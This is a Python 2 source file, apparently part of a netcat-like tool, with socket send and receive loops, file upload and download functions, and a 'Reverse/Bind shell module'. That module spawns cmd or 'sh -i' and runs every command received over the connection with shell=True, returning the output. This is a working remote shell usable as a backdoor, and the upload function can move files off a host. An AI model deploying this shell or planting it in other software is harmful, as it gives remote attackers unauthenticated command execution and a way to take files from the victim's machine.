import subprocess
import os
import sys


#sender module
def send(client):
    try:
        while (True):
            data = raw_input("")
            client.sendall(data + "\n")
    except Exception as e:
        print("[-]FATAL: " + str(e))

#Receiving module
def recv(client):
    while (True):
        try:
            sys.stdout.write(client.recv(106000))
        except Exception as e:
            print("[-]FATAL: " + str(e))
            sys.exit(-1)

#Reverse/Bind shell module
def shell(conn):

    conn.sendall("\n[+]Shell spawned successfully..\n\n")
    if "win" in sys.platform:
        shell_message = subprocess.check_output("exit|cmd", stderr=subprocess.STDOUT, shell=True)
        conn.sendall(shell_message)
    else:
        shell_message = subprocess.check_output("exit|sh -i", stderr=subprocess.STDOUT, shell=True)
        conn.sendall(shell_message)
    while True:
        command = conn.recv(1024)
        command = command.rstrip()
        if command in ("exit", "quit"):
            if mode == "listen":
                conn.sendall("\n[+]Exiting shell mode..\n[+]Reverting back to listener mode.\n")
                break
            else:
                conn.sendall("\n[+]Exiting shell mode..\n")
                sys.exit(0)
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            conn.sendall("[*]Executing..\n\n")
            conn.sendall(output)
            conn.sendall("> ")
        except Exception as e:
            conn.sendall("[-]" + str(e) + "\n")
            conn.sendall("> ")

#Uploader module
def upload(path, conn):
    print("[+]Uploading..")
    try:
        f = open(path, 'rb')
        sent_buff = f.read()
        buff_size = os.path.getsize(path)
        buff_size = format(buff_size, 'd')
        file_name = os.path.basename(path)
        conn.sendall(buff_size)
        conn.sendall(file_name)
        conn.sendall(sent_buff)
        f.close()
        print("[+]Upload Complete.")
        sys.exit(0)
    except Exception as e:
        print("[-]FATAL: " + str(e))
        sys.exit(-1)
    
#Downloader module
def download(conn):
    try:
        file_size = conn.recv(1024)
        file_size = int(file_size)
        file_name = conn.recv(1024)
        file_data = conn.recv(file_size)
        print("\nFile name: " + file_name +"\nSize: " + `file_size` + " BYTES")
        print("\n[+]Downloading..")
        f = open(file_name, 'wb')
        f.write(file_data)
        f.close()
        print("[+]Download Complete.")
        sys.exit(0)
    except Exception as e:
        print("[-]FATAL: " + str(e))
        sys.exit(-1)